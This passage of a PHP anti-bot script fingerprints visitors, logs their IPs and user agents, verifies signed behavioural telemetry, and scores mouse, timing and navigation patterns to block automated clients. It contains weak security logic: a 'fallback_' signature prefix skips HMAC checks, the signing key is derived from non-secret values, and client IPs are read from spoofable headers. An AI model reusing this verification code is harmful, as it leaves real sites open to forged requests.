<?php

$uri = $_SERVER['REQUEST_URI'] ?? '';
$basename = basename(parse_url($uri, PHP_URL_PATH));
$is_js_fetch = isset($_SERVER['HTTP_SEC_FETCH_MODE']) && $_SERVER['HTTP_SEC_FETCH_MODE'] === 'cors';

// Helper function to get client IP (needed early for POST handlers)
function get_client_ip(){
    if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $xff = explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"]);
        return trim($xff[0]);
    }
    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    if (!empty($_SERVER["HTTP_FORWARDED_FOR"])) {
        $fwd = explode(",", $_SERVER["HTTP_FORWARDED_FOR"]);
        return trim($fwd[0]);
    }
    if (!empty($_SERVER["HTTP_FORWARDED"])) {
        $parts = explode(";", $_SERVER["HTTP_FORWARDED"]);
        foreach ($parts as $p) {
            $p = trim($p);
            if (stripos($p, "for=") === 0) {
                return trim(substr($p, 4));
            }
        }
    }
    return $_SERVER["REMOTE_ADDR"] ?? '0.0.0.0';
}

// ✅ Handle automation detection reports from frontend
if ($basename === 'antibot-report.php' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = file_get_contents('php://input');
    $report = json_decode($data, true);
    
    if ($report && isset($report['type']) && $report['type'] === 'automation_detected') {
        $log_dir = __DIR__ . '/logs';
        if (!is_dir($log_dir)) {
            @mkdir($log_dir, 0755, true);
        }
        
        $client_ip = get_client_ip();
        $log_entry = date('Y-m-d H:i:s') . ' | AUTOMATION DETECTED | IP: ' . 
                     $client_ip . 
                     ' | Flags: ' . implode(', ', $report['flags'] ?? []) . 
                     ' | Score: ' . ($report['score'] ?? 0) . "\n";
        
        file_put_contents($log_dir . '/automation.log', $log_entry, FILE_APPEND);
        
        // Block this IP immediately
        http_response_code(403);
        header('Location: https://www.google.com');
        exit;
    }
    exit;
}

// ============================================
// CRYPTOGRAPHIC SIGNATURE VERIFICATION
// ============================================

define('NONCE_FILE', __DIR__ . '/nonces.json');

/**
 * Load used nonces for replay attack prevention
 */
function load_nonces() {
    if (!file_exists(NONCE_FILE)) {
        file_put_contents(NONCE_FILE, json_encode([], JSON_PRETTY_PRINT));
    }
    return json_decode(file_get_contents(NONCE_FILE), true) ?: [];
}

/**
 * Save nonces
 */
function save_nonces($nonces) {
    file_put_contents(NONCE_FILE, json_encode($nonces, JSON_PRETTY_PRINT));
}

/**
 * Check if nonce has been used (replay attack detection)
 */
function is_nonce_used($nonce) {
    $nonces = load_nonces();
    return isset($nonces[$nonce]);
}

/**
 * Mark nonce as used
 */
function mark_nonce_used($nonce) {
    $nonces = load_nonces();
    $nonces[$nonce] = [
        'used_at' => time(),
        'ip' => get_client_ip()
    ];
    
    // Cleanup old nonces (older than 1 hour)
    $cutoff = time() - 3600;
    foreach ($nonces as $n => $data) {
        if ($data['used_at'] < $cutoff) {
            unset($nonces[$n]);
        }
    }
    
    save_nonces($nonces);
}

/**
 * Verify nonce is valid and not expired
 */
function verify_nonce($nonce) {
    // Nonce format: timestamp_random
    $parts = explode('_', $nonce);
    if (count($parts) < 2) {
        return false;
    }
    
    $timestamp = intval($parts[0]);
    $now = time() * 1000; // Convert to milliseconds
    
    // Nonce must not be older than 5 minutes
    if (($now - $timestamp) > 300000) {
        return false;
    }
    
    // Nonce must not be from the future (with 1 minute tolerance)
    if ($timestamp > $now + 60000) {
        return false;
    }
    
    // Check if nonce was already used (replay attack)
    if (is_nonce_used($nonce)) {
        return false;
    }
    
    return true;
}

/**
 * Generate expected signing key for a session
 * This matches the client-side key generation
 */
function generate_signing_key($session_id, $user_agent) {
    $keyBase = $session_id . '_' . $_SERVER['SERVER_NAME'] . '_' . substr($user_agent, 0, 50);
    return substr(base64_encode($keyBase), 0, 32);
}

/**
 * Verify HMAC signature of telemetry data
 */
function verify_telemetry_signature($payload, $signature, $nonce, $session_id, $user_agent) {
    // Generate expected signing key
    $signingKey = generate_signing_key($session_id, $user_agent);
    
    // Calculate expected signature: HMAC(key, nonce + payload)
    $messageToSign = $nonce . $payload;
    $expectedSignature = hash_hmac('sha256', $messageToSign, $signingKey);
    
    // Constant-time comparison to prevent timing attacks
    return hash_equals($expectedSignature, $signature);
}

// ✅ Handle behavioral tracking data from frontend with signature verification
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['track_behavior'])) {
    $behavior_json = $_POST['behavior_data'] ?? '';
    $signature = $_POST['signature'] ?? '';
    $nonce = $_POST['nonce'] ?? '';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // CRITICAL: Verify signature before processing any data
    // This prevents bots from sending forged telemetry
    $signature_valid = false;
    $nonce_valid = false;
    
    if (!empty($signature) && !empty($nonce) && strlen($behavior_json) > 0) {
        // Parse behavior data to get session_id
        $behavior_data = json_decode($behavior_json, true);
        
        if ($behavior_data && isset($behavior_data['session_id'])) {
            // Verify nonce is valid and not reused
            $nonce_valid = verify_nonce($nonce);
            
            if ($nonce_valid) {
                // Verify signature
                if (strpos($signature, 'fallback_') === 0) {
                    // Client used fallback signing (old browser)
                    // Be more lenient but still validate format
                    $signature_valid = strlen($signature) > 20;
                } else {
                    // Full HMAC verification
                    $signature_valid = verify_telemetry_signature(
                        $behavior_json,
                        $signature,
                        $nonce,
                        $behavior_data['session_id'],
                        $user_agent
                    );
                }
                
                if ($signature_valid) {
                    // Mark nonce as used to prevent replay
                    mark_nonce_used($nonce);
                }
            }
        }
    }
    
    // Block unsigned or invalid telemetry
    if (!$signature_valid || !$nonce_valid) {
        // Log security event
        $client_ip = get_client_ip();
        $reason = !$nonce_valid ? 'Invalid/expired/reused nonce' : 'Invalid signature';
        
        if (is_dir(__DIR__ . '/logs')) {
            file_put_contents(
                __DIR__ . '/logs/security.log',
                date('Y-m-d H:i:s') . " | UNSIGNED_TELEMETRY | IP: {$client_ip} | Reason: {$reason}\n",
                FILE_APPEND
            );
        }
        
        // Return 403 Forbidden for unsigned data
        http_response_code(403);
        exit;
    }
    
    // Signature verified - process the data
    $behavior_json = $_POST['behavior_data'] ?? '';
    
    // Validate data size
    if (strlen($behavior_json) > 0 && strlen($behavior_json) <= 102400) { // 100KB max
        $behavior_data = json_decode($behavior_json, true);
        
        if ($behavior_data && isset($behavior_data['session_id'], $behavior_data['action'])) {
            // Use get_client_ip() to match the IP detection used throughout the system
            $client_ip = get_client_ip();
            
            // Track the behavioral data
            if ($behavior_data['action'] === 'batch_tracking') {
                // Load existing behavior data
                $all_behaviors = load_behavior_data();
                
                if (!isset($all_behaviors[$client_ip])) {
                    $all_behaviors[$client_ip] = ['sessions' => [], 'first_seen' => time()];
                }
                
                $session_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $behavior_data['session_id']);
                $session_id = substr($session_id, 0, 64);
                
                if (!isset($all_behaviors[$client_ip]['sessions'][$session_id])) {
                    $all_behaviors[$client_ip]['sessions'][$session_id] = [
                        'actions' => [],
                        'start_time' => time()
                    ];
                }
                
                // Add actions from the batch
                if (isset($behavior_data['actions']) && is_array($behavior_data['actions'])) {
                    foreach ($behavior_data['actions'] as $action) {
                        $all_behaviors[$client_ip]['sessions'][$session_id]['actions'][] = [
                            'action' => $action['action'] ?? 'unknown',
                            'timestamp' => $action['timestamp'] ?? time(),
                            'type' => $action['action'] ?? 'unknown',
                            'data' => $action['data'] ?? []
                        ];
                    }
                }
                
                // Save updated behavior data
                save_behavior_data($all_behaviors);
            }
        }
    }
    
    // Return success (no output needed for beacon)
    http_response_code(204); // No Content
    exit;
}

// ✅ استثناء كامل لمكالمات fetch()
if (
    in_array($basename, ['start_session.php', 'render.php']) &&
    $is_js_fetch
) {
    return;
}

define('FP_FILE', __DIR__ . '/fingerprints.json');
define('BEHAVIOR_FILE', __DIR__ . '/behavior_tracking.json');
define('ACCESS_LOG_FILE', __DIR__ . '/logs/access_log.json');

// Behavioral analysis thresholds (in milliseconds unless noted)
define('MIN_HUMAN_ACTION_TIME', 100);        // Minimum time between actions for humans (ms)
define('SESSION_GAP_THRESHOLD', 5);          // Minimum time between sessions for humans (seconds)
define('SESSION_GAP_SCORE', 30);             // Score penalty for suspicious session gaps
define('MAX_BEHAVIOR_DATA_SIZE', 102400);    // Maximum POST data size (100KB)

// Ensure logs directory exists
if (!is_dir(__DIR__ . '/logs')) {
    $dir_created = @mkdir(__DIR__ . '/logs', 0755, true);
    if (!$dir_created && !is_dir(__DIR__ . '/logs')) {
        error_log('Anti-bot: Failed to create logs directory');
    }
}

if (is_dir(__DIR__ . '/logs')) {
    file_put_contents('logs/blocked.txt', $_SERVER['REMOTE_ADDR']." | ".$_SERVER['HTTP_USER_AGENT']."\n", FILE_APPEND);
}

// Enhanced fingerprint system with dynamic salting and session-network binding
function load_fingerprints() {
    if (!file_exists(FP_FILE)) file_put_contents(FP_FILE, json_encode([], JSON_PRETTY_PRINT));
    return json_decode(file_get_contents(FP_FILE), true) ?: [];
}

/**
 * Extract network subnet from IP address
 * Supports IPv4 (first 3 octets) and basic IPv6 handling
 */
function extract_subnet($ip) {
    // Check if IPv6
    if (strpos($ip, ':') !== false) {
        // For IPv6, use first 4 segments (simplified subnet)
        $parts = explode(':', $ip);
        return implode(':', array_slice($parts, 0, min(4, count($parts)))) . '::';
    }
    
    // IPv4: first 3 octets
    $ip_parts = explode('.', $ip);
    if (count($ip_parts) !== 4) {
        // Invalid IP format, return as-is
        return $ip;
    }
    return implode('.', array_slice($ip_parts, 0, 3)) . '.0';
}

/**
 * Get secret salt for fingerprinting
 * Should be unique per installation and rotated periodically
 */
function get_fingerprint_salt() {
    global $config;
    
    // Try to get from config first
    if (isset($config['fingerprint_salt']) && !empty($config['fingerprint_salt'])) {
        return $config['fingerprint_salt'];
    }
    
    // Fallback: generate from server-specific data
    // Note: This should be set in config.php for production
    $server_unique = $_SERVER['SERVER_NAME'] ?? 'localhost';
    $server_unique .= $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
    return hash('sha256', $server_unique . 'antibot_fallback_salt');
}

/**
 * Generate dynamic salted fingerprint with session-network binding
 * Prevents static replayable fingerprints by incorporating:
 * - Dynamic timestamp-based salt (rotates every hour)
 * - Session ID binding
 * - Network characteristics (IP subnet)
 * - TLS/HTTP header entropy
 */
function generate_dynamic_fingerprint($ip, $session_id = null) {
    // Dynamic salt that rotates every hour using config-based secret
    $hour_salt = hash('sha256', date('YmdH') . get_fingerprint_salt());
    
    // Session binding - use actual session ID or generate one
    if ($session_id === null) {
        if (session_status() === PHP_SESSION_NONE) {
            @session_start();
        }
        $session_id = session_id();
    }
    
    // Network binding - extract subnet with IPv4/IPv6 support
    $subnet = extract_subnet($ip);
    
    // TLS/HTTP header entropy analysis
    $header_entropy = calculate_header_entropy();
    
    // Combine all factors with dynamic salt
    $fingerprint_data = [
        'hour_salt' => $hour_salt,
        'session_id' => $session_id,
        'subnet' => $subnet,
        'header_entropy' => $header_entropy,
        'timestamp' => time()
    ];
    
    return hash('sha256', json_encode($fingerprint_data));
}

/**
 * Calculate TLS/HTTP header entropy for fingerprinting
 * Analyzes header patterns similar to JA3 fingerprinting
 */
function calculate_header_entropy() {
    $headers = [];
    
    // Collect significant headers in order (like JA3)
    $header_keys = [
        'HTTP_USER_AGENT',
        'HTTP_ACCEPT',
        'HTTP_ACCEPT_LANGUAGE',
        'HTTP_ACCEPT_ENCODING',
        'HTTP_CONNECTION',
        'HTTP_SEC_CH_UA',
        'HTTP_SEC_CH_UA_MOBILE',
        'HTTP_SEC_CH_UA_PLATFORM',
        'HTTP_SEC_FETCH_SITE',
        'HTTP_SEC_FETCH_MODE',
        'HTTP_SEC_FETCH_DEST'
    ];
    
    foreach ($header_keys as $key) {
        $headers[] = isset($_SERVER[$key]) ? substr($_SERVER[$key], 0, 50) : '';
    }
    
    // Calculate entropy hash (similar to JA3 approach)
    return hash('md5', implode('|', $headers));
}

/**
 * Verify session-network binding
 * Ensures the session is bound to the same network context
 */
function verify_session_binding($ip, $stored_fingerprint) {
    // Generate current fingerprint with same session
    $current_fingerprint = generate_dynamic_fingerprint($ip);
    
    // For session binding, we verify the subnet hasn't changed
    $current_subnet = extract_subnet($ip);
    
    // Check if stored fingerprint data exists
    $fps = load_fingerprints();
    if (!isset($fps[$ip])) {
        return false;
    }
    
    $stored_data = $fps[$ip];
    if (isset($stored_data['subnet']) && $stored_data['subnet'] !== $current_subnet) {
        // Network changed - possible session hijacking
        return false;
    }
    
    return true;
}

function save_fingerprint($ip, $hash, $session_id = null) {
    $fps = load_fingerprints();
    
    // Store fingerprint with metadata for binding verification
    $subnet = extract_subnet($ip);
    
    $fps[$ip] = [
        'hash' => $hash,
        'subnet' => $subnet,
        'session_id' => $session_id ?? session_id(),
        'created_at' => time(),
        'header_entropy' => calculate_header_entropy()
    ];
    
    file_put_contents(FP_FILE, json_encode($fps, JSON_PRETTY_PRINT));
}

function get_fingerprint_for_ip($ip) {
    $fps = load_fingerprints();
    return $fps[$ip] ?? null;
}

// Admin monitoring - Log access attempt with secure logging practices
function log_access_attempt($ip, $verdict, $bot_score, $bot_analysis, $characteristics = [], $automation_flags = []) {
    global $config;
    
    if (!defined('ACCESS_LOG_FILE')) {
        return; // Skip if not defined
    }
    
    // Get logging configuration
    $logging_config = $config['logging'] ?? [];
    $hash_fingerprints = $logging_config['hash_fingerprints'] ?? true;
    $hide_rejection_reasons = $logging_config['hide_rejection_reasons'] ?? true;
    $hide_raw_scores = $logging_config['hide_raw_scores'] ?? true;
    $separate_security_logs = $logging_config['separate_security_logs'] ?? true;
    
    // Hash IP for privacy (but keep in security log)
    $hashed_ip = $hash_fingerprints ? hash('sha256', $ip . 'antibot_salt') : $ip;
    
    // Load existing logs
    $logs = [];
    if (file_exists(ACCESS_LOG_FILE)) {
        $content = file_get_contents(ACCESS_LOG_FILE);
        $logs = json_decode($content, true) ?: [];
    }
    
    // Create log entry with obfuscated data
    $entry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'ip_hash' => $hashed_ip, // Hashed for privacy
        'verdict' => $verdict, // 'human', 'bot', 'uncertain', 'automation'
        'bot_score' => $hide_raw_scores ? 'hidden' : round($bot_score, 2),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'characteristics' => $characteristics,
        'domain_scores' => [
            'temporal' => $hide_raw_scores ? 'hidden' : ($bot_analysis['domain_scores']['temporal'] ?? 0),
            'noise' => $hide_raw_scores ? 'hidden' : ($bot_analysis['domain_scores']['noise'] ?? 0),
            'semantics' => $hide_raw_scores ? 'hidden' : ($bot_analysis['domain_scores']['semantics'] ?? 0),
            'continuity' => $hide_raw_scores ? 'hidden' : ($bot_analysis['domain_scores']['continuity'] ?? 0)
        ],
        'flags' => $hide_rejection_reasons ? ['hidden'] : ($bot_analysis['reasons'] ?? []),
        'automation_flags' => $automation_flags
    ];
    
    // Add to logs (keep last 1000 entries)
    $logs[] = $entry;
    $logs = array_slice($logs, -1000);
    
    // Save to main access log
    file_put_contents(ACCESS_LOG_FILE, json_encode($logs, JSON_PRETTY_PRINT));
    
    // If separate security logs enabled, write detailed info there
    if ($separate_security_logs && isset($config['security_log_file'])) {
        $security_entry = date('Y-m-d H:i:s') . " | " . 
            "VERDICT: {$verdict} | " .
            "IP: {$ip} | " . // Real IP in security log
            "SCORE: " . round($bot_score, 2) . " | " .
            "REASONS: " . implode(', ', $bot_analysis['reasons'] ?? []) . "\n";
        
        file_put_contents($config['security_log_file'], $security_entry, FILE_APPEND);
    }
}

// Behavioral tracking functions
function load_behavior_data() {
    if (!file_exists(BEHAVIOR_FILE)) {
        file_put_contents(BEHAVIOR_FILE, json_encode([], JSON_PRETTY_PRINT));
    }
    return json_decode(file_get_contents(BEHAVIOR_FILE), true) ?: [];
}

function save_behavior_data($data) {
    file_put_contents(BEHAVIOR_FILE, json_encode($data, JSON_PRETTY_PRINT));
}

// ============================================
// SESSION AGING & TRUST DECAY
// ============================================

/**
 * Calculate session trust score based on age
 * Trust decreases over time to force periodic re-evaluation
 */
function calculate_session_trust($session_start_time, $config) {
    $now = time();
    $session_age = $now - $session_start_time;
    
    // Get decay rate from config (default 5% per hour)
    $decay_rate_per_hour = $config['session_trust_decay_rate'] ?? 5;
    
    // Calculate hours elapsed
    $hours_elapsed = $session_age / 3600;
    
    // Calculate trust: starts at 100%, decays over time
    $trust = 100 - ($hours_elapsed * $decay_rate_per_hour);
    
    // Trust can't go below 0
    $trust = max(0, $trust);
    
    // Check if session exceeded max age
    $max_age = $config['session_max_age'] ?? 86400; // 24 hours default
    if ($session_age > $max_age) {
        // Session too old - force re-verification
        return 0;
    }
    
    return $trust;
}

/**
 * Check if session needs re-evaluation
 * Returns true if trust is too low or behavioral deviations detected
 */
function needs_reevaluation($ip, $config) {
    // Check fingerprint data for session age
    $fp_data = get_fingerprint_for_ip($ip);
    if (!$fp_data || !isset($fp_data['created_at'])) {
        return true; // No valid session
    }
    
    // Calculate current trust
    $trust = calculate_session_trust($fp_data['created_at'], $config);
    
    // Re-evaluate if trust below 30%
    if ($trust < 30) {
        return true;
    }
    
    // Check for behavioral deviations
    $behavior_data = load_behavior_data();
    if (isset($behavior_data[$ip])) {
        $ip_behavior = $behavior_data[$ip];
        
        // Check for sudden changes in behavior patterns
        if (isset($ip_behavior['sessions'])) {
            $sessions = array_values($ip_behavior['sessions']);
            $session_count = count($sessions);
            
            if ($session_count >= 2) {
                // Compare recent session to earlier sessions
                $recent = end($sessions);
                $earlier = $sessions[0];
                
                // Check if action patterns changed significantly
                $recent_actions = count($recent['actions'] ?? []);
                $earlier_actions = count($earlier['actions'] ?? []);
                
                if ($earlier_actions > 0) {
                    $change_ratio = abs($recent_actions - $earlier_actions) / $earlier_actions;
                    
                    // If pattern changed more than 200%, flag for re-evaluation
                    if ($change_ratio > 2.0) {
                        return true;
                    }
                }
            }
        }
    }
    
    return false;
}

/**
 * Force session re-verification
 */
function force_session_reverification($ip) {
    // Clear all cookies
    setcookie('fp_hash', '', time() - 3600, '/');
    setcookie('js_verified', '', time() - 3600, '/');
    setcookie('analysis_done', '', time() - 3600, '/');
    setcookie('behavior_verified', '', time() - 3600, '/');
    
    // Remove fingerprint
    $fps = load_fingerprints();
    unset($fps[$ip]);
    file_put_contents(FP_FILE, json_encode($fps, JSON_PRETTY_PRINT));
}

function track_temporal_behavior($ip, $action, $timestamp, $data = []) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip])) {
        $behaviors[$ip] = ['sessions' => [], 'first_seen' => time()];
    }
    
    // Sanitize session ID from cookie or use PHP's session_id()
    $raw_session_id = $_COOKIE['session_id'] ?? session_id();
    $session_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $raw_session_id);
    $session_id = substr($session_id, 0, 64); // Limit length
    
    if (!isset($behaviors[$ip]['sessions'][$session_id])) {
        $behaviors[$ip]['sessions'][$session_id] = ['actions' => [], 'start_time' => time()];
    }
    
    $behaviors[$ip]['sessions'][$session_id]['actions'][] = [
        'action' => $action,
        'timestamp' => $timestamp,
        'data' => $data
    ];
    
    save_behavior_data($behaviors);
    return $behaviors[$ip];
}

function analyze_temporal_patterns($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    
    foreach ($behaviors[$ip]['sessions'] as $session_id => $session) {
        if (empty($session['actions']) || count($session['actions']) < 3) {
            continue;
        }
        
        $timings = [];
        for ($i = 1; $i < count($session['actions']); $i++) {
            $diff = $session['actions'][$i]['timestamp'] - $session['actions'][$i-1]['timestamp'];
            $timings[] = $diff;
        }
        
        // Check for mathematically equal timings
        $timing_variance = count(array_unique($timings)) / max(count($timings), 1);
        if ($timing_variance < 0.5 && count($timings) >= 3) {
            $score += 30;
            $reasons[] = 'Equal click timings detected';
        }
        
        // Check for absence of hesitation (all actions too fast)
        // Threshold: MIN_HUMAN_ACTION_TIME - Human users typically take at least 100ms between actions
        // due to perception, decision-making, and motor response time
        $avg_timing = array_sum($timings) / max(count($timings), 1);
        if ($avg_timing < MIN_HUMAN_ACTION_TIME) {
            $score += 25;
            $reasons[] = 'No hesitation or natural pauses';
        }
        
        // Check for constant reading times
        $reading_actions = array_filter($session['actions'], function($a) {
            return isset($a['data']['text_length']);
        });
        if (count($reading_actions) >= 2) {
            $read_times = [];
            foreach ($reading_actions as $action) {
                if (isset($action['data']['read_time'])) {
                    $read_times[] = $action['data']['read_time'];
                }
            }
            if (count($read_times) >= 2 && count(array_unique($read_times)) === 1) {
                $score += 20;
                $reasons[] = 'Constant reading times regardless of content';
            }
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function analyze_interaction_noise($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $total_actions = 0;
    $error_count = 0;
    $canceled_count = 0;
    $efficient_count = 0;
    
    foreach ($behaviors[$ip]['sessions'] as $session) {
        foreach ($session['actions'] as $action) {
            $total_actions++;
            
            if (isset($action['data']['input_error']) && $action['data']['input_error']) {
                $error_count++;
            }
            if (isset($action['data']['canceled']) && $action['data']['canceled']) {
                $canceled_count++;
            }
            if (isset($action['data']['skipped_visual_hints']) && $action['data']['skipped_visual_hints']) {
                $efficient_count++;
            }
        }
    }
    
    // Human users make minor errors
    if ($total_actions > 10 && $error_count === 0 && $canceled_count === 0) {
        $score += 40;
        $reasons[] = 'No interaction noise (errors/cancellations)';
    }
    
    // Over-efficient interaction
    if ($total_actions > 5 && $efficient_count / $total_actions > 0.8) {
        $score += 35;
        $reasons[] = 'Overly efficient, ignoring visual hints';
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function analyze_ui_semantics($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    
    foreach ($behaviors[$ip]['sessions'] as $session) {
        $ignores_cosmetic = 0;
        $total_interactions = 0;
        
        foreach ($session['actions'] as $action) {
            if (isset($action['data']['element_type'])) {
                $total_interactions++;
                if (isset($action['data']['ignores_cosmetic']) && $action['data']['ignores_cosmetic']) {
                    $ignores_cosmetic++;
                }
            }
        }
        
        if ($total_interactions > 0 && $ignores_cosmetic / $total_interactions > 0.9) {
            $score += 45;
            $reasons[] = 'Ignores cosmetic/decorative elements';
        }
        
        // Check for robotic patterns unaffected by visual rearrangement
        if (isset($session['actions'][0]['data']['visual_order_changed'])) {
            $unchanged_pattern = true;
            for ($i = 1; $i < count($session['actions']); $i++) {
                if (isset($session['actions'][$i]['data']['adapted_to_order'])) {
                    $unchanged_pattern = false;
                    break;
                }
            }
            if ($unchanged_pattern && count($session['actions']) > 3) {
                $score += 40;
                $reasons[] = 'Robotic pattern, unaffected by visual changes';
            }
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

/**
 * Analyze mouse movement characteristics for bot detection
 * Examines entropy, smoothness, jitter, and linear patterns
 */
function analyze_mouse_movements($ip) {
    global $config;
    
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $mouse_config = $config['mouse_analysis'] ?? [];
    
    // Analyze mouse_analysis actions from JavaScript tracking
    foreach ($behaviors[$ip]['sessions'] as $session) {
        foreach ($session['actions'] as $action) {
            if ($action['action'] === 'mouse_analysis' && isset($action['data'])) {
                $data = $action['data'];
                
                // Check entropy (should be > 0.3 for humans)
                if (isset($data['entropy'])) {
                    $min_entropy = $mouse_config['min_entropy'] ?? 0.3;
                    if ($data['entropy'] < $min_entropy) {
                        $score += 35;
                        $reasons[] = 'Low mouse movement entropy (predictable patterns)';
                    }
                }
                
                // Check smoothness (too smooth = bot)
                if (isset($data['smoothness'])) {
                    $max_smoothness = $mouse_config['curve_smoothness_max'] ?? 0.9;
                    if ($data['smoothness'] > $max_smoothness) {
                        $score += 30;
                        $reasons[] = 'Overly smooth mouse curves (no natural variation)';
                    }
                }
                
                // Check jitter (humans have natural hand tremor)
                if (isset($data['jitter'])) {
                    $min_jitter = $mouse_config['min_jitter_variance'] ?? 0.1;
                    if ($data['jitter'] < $min_jitter && $mouse_config['jitter_required'] ?? true) {
                        $score += 25;
                        $reasons[] = 'No mouse jitter (missing natural hand tremor)';
                    }
                }
                
                // Check for linear movements
                if (isset($data['is_linear']) && $data['is_linear']) {
                    $score += 40;
                    $reasons[] = 'Perfectly linear mouse movements (bot-like)';
                }
            }
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

/**
 * Detect idealized/perfect behavior patterns
 * Humans make mistakes and show variance - bots don't
 */
function detect_idealized_behavior($ip) {
    global $config;
    
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $idealized_config = $config['idealized_behavior'] ?? [];
    
    $all_sessions = $behaviors[$ip]['sessions'];
    
    // 1. Check for perfect timing (zero variance)
    $all_intervals = [];
    foreach ($all_sessions as $session) {
        if (isset($session['actions']) && count($session['actions']) > 2) {
            for ($i = 1; $i < count($session['actions']); $i++) {
                $interval = $session['actions'][$i]['timestamp'] - $session['actions'][$i-1]['timestamp'];
                $all_intervals[] = $interval;
            }
        }
    }
    
    if (count($all_intervals) >= 5) {
        $avg_interval = array_sum($all_intervals) / count($all_intervals);
        $variance = 0;
        foreach ($all_intervals as $interval) {
            $variance += pow($interval - $avg_interval, 2);
        }
        $variance = $variance / count($all_intervals);
        $std_dev = sqrt($variance);
        
        // Calculate coefficient of variation
        $cv = $avg_interval > 0 ? ($std_dev / $avg_interval) : 0;
        
        $perfect_timing_threshold = $idealized_config['perfect_timing_threshold'] ?? 0.15;
        if ($cv < $perfect_timing_threshold) {
            $penalty = $idealized_config['identical_path_penalty'] ?? 50;
            $score += $penalty;
            $reasons[] = 'Perfect timing intervals (mathematical precision, no human variance)';
        }
    }
    
    // 2. Check for zero errors across all sessions
    $total_actions = 0;
    $error_actions = 0;
    foreach ($all_sessions as $session) {
        if (isset($session['actions'])) {
            foreach ($session['actions'] as $action) {
                $total_actions++;
                if (in_array($action['action'], ['keystroke', 'click_canceled']) && 
                    isset($action['data']['input_error']) && $action['data']['input_error']) {
                    $error_actions++;
                }
            }
        }
    }
    
    if ($total_actions > 20 && $error_actions === 0) {
        $penalty = $idealized_config['zero_error_penalty'] ?? 40;
        $score += $penalty;
        $reasons[] = 'Zero errors in ' . $total_actions . ' actions (inhuman perfection)';
    }
    
    // 3. Check for identical navigation paths
    $nav_paths = [];
    foreach ($all_sessions as $session) {
        $path = [];
        if (isset($session['actions'])) {
            foreach ($session['actions'] as $action) {
                if ($action['action'] === 'navigate' && isset($action['data']['path'])) {
                    $path[] = $action['data']['path'];
                }
            }
        }
        if (!empty($path)) {
            $nav_paths[] = implode('->', $path);
        }
    }
    
    if (count($nav_paths) >= 2) {
        $unique_paths = count(array_unique($nav_paths));
        if ($unique_paths === 1) {
            // All paths identical
            $penalty = $idealized_config['identical_path_penalty'] ?? 50;
            $score += $penalty;
            $reasons[] = 'Identical navigation path repeated across all sessions';
        }
    }
    
    // 4. Check for reused fingerprints across sessions
    $fps = load_fingerprints();
    $fp_history = [];
    foreach ($fps as $ip_key => $fp_data) {
        if ($ip_key === $ip && isset($fp_data['hash'])) {
            $fp_history[] = $fp_data['hash'];
        }
    }
    
    // Check if same fingerprint used multiple times (should change hourly)
    if (count($fp_history) > 1) {
        $unique_fps = count(array_unique($fp_history));
        if ($unique_fps === 1 && count($fp_history) >= 3) {
            $penalty = $idealized_config['identical_fingerprint_penalty'] ?? 60;
            $score += $penalty;
            $reasons[] = 'Identical fingerprint reused ' . count($fp_history) . ' times (replay attack)';
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function analyze_session_continuity($ip) {
    $behaviors = load_behavior_data();
    if (!isset($behaviors[$ip]) || !isset($behaviors[$ip]['sessions'])) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $score = 0;
    $reasons = [];
    $sessions = $behaviors[$ip]['sessions'];
    
    if (count($sessions) < 2) {
        return ['score' => 0, 'reasons' => []];
    }
    
    $navigation_patterns = [];
    foreach ($sessions as $session) {
        $nav_sequence = [];
        foreach ($session['actions'] as $action) {
            if ($action['action'] === 'navigate' && isset($action['data']['path'])) {
                $nav_sequence[] = $action['data']['path'];
            }
        }
        if (!empty($nav_sequence)) {
            $navigation_patterns[] = implode('>', $nav_sequence);
        }
    }
    
    // Check for repeated identical navigation without natural variation
    if (count($navigation_patterns) >= 2) {
        $unique_patterns = count(array_unique($navigation_patterns));
        if ($unique_patterns / count($navigation_patterns) < 0.3) {
            $score += 50;
            $reasons[] = 'Repeated identical navigation patterns';
        }
    }
    
    // Check for missing ordinary resume logic
    $session_times = array_column($sessions, 'start_time');
    sort($session_times);
    for ($i = 1; $i < count($session_times); $i++) {
        $gap = $session_times[$i] - $session_times[$i-1];
        // Threshold: SESSION_GAP_THRESHOLD - Legitimate users typically have larger gaps between sessions
        // Sessions less than 5 seconds apart indicate automated behavior without natural delays
        if ($gap < SESSION_GAP_THRESHOLD) {
            $score += SESSION_GAP_SCORE;
